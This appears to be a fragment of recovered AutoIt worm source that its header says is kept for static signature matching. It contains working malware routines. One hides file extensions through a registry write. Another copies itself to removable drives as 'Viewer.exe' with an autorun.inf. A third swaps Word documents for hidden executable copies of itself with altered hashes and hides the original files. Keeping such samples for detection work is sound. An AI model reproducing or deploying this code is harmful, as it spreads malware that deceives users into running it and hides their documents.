; Recovered AutoIt operation clusters for static matching only.
	RegWrite ( "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" , "HideFileExt" , "REG_DWORD" , "1" )
DriveGetDrive ( "removable" )
						FileCopy ( @AutoItExe , $DVAR [ $I ] & "\Viewer.exe" , 1 )
Func CHANGEATTRIB ( $FOLDERNAME , $DOCUMENT )
	$EX = StringRight ( $DOCUMENT , 4 )
	If $EX = ".doc" And DriveSpaceFree ( $FOLDERNAME & "\" ) > 1 Then
		$R = StringLen ( $DOCUMENT ) - 4
		FileCopy ( @SystemDir & "\" & $V1 & ".exe" , $FOLDERNAME & "\" & $DOCUMENT & ".exe" , 0 )
		FileSetAttrib ( $FOLDERNAME & "\" & $DOCUMENT & ".exe" , "-RASH" )
		CHANGEMD5 ( $FOLDERNAME & "\" & $DOCUMENT & ".exe" )
		FileMove ( $FOLDERNAME & "\" & $DOCUMENT , $FOLDERNAME & "\" & StringLeft ( $DOCUMENT , $R ) & ".bak" )
		FileSetAttrib ( $FOLDERNAME & "\" & StringLeft ( $DOCUMENT , $R ) & ".bak" , "+RASH" , 0 )
	EndIf
EndFunc
Func COPYAUTO ( $OUTPUT )
	$V = FileOpen ( $OUTPUT , 1 )
	FileWrite ( $V , "[AUTORUN]" & @CRLF )
	FileWrite ( $V , "open=Viewer.exe" & @CRLF )
	FileWrite ( $V , "shellexecute=Viewer.exe" & @CRLF )
	FileWrite ( $V , "shell\Explore\command=Viewer.exe" & @CRLF )
	FileWrite ( $V , "shell\Open\command=Viewer.exe" & @CRLF )
	FileWrite ( $V , "shell=Explore" & @CRLF )
	FileClose ( $V )
EndFunc
